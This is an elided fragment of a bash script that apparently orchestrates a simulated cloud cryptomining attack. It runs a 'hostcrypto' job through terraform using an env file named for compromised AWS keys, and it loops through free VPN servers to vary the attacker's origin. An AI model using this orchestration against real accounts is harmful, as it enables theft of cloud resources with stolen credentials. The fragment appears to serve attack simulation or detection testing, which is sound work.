...
LOGFILE=/tmp/attacker_host_cryptomining_auto-free.sh.log
function log {
...
function execute_script {
    if [ $SECONDS_WAITED -lt $MAX_WAIT ]; then
        ...
        log "Executing hostcrypto"
        bash start.sh --container=terraform --env-file=.env-aws-compromised_keys_user --script="hostcrypto" >> $LOGFILE 2>&1
        log "Done hostcrypto."
    else
...
log "Wait attack_delay seconds before starting attacker hostcrypto..."
sleep attack_delay

SERVERS="NL-FREE#148 JP-FREE#3 US-FREE#34"
for SERVER in $SERVERS; do
    log "Wait 60 seconds before starting attacker hostcrypto..."
    sleep 60
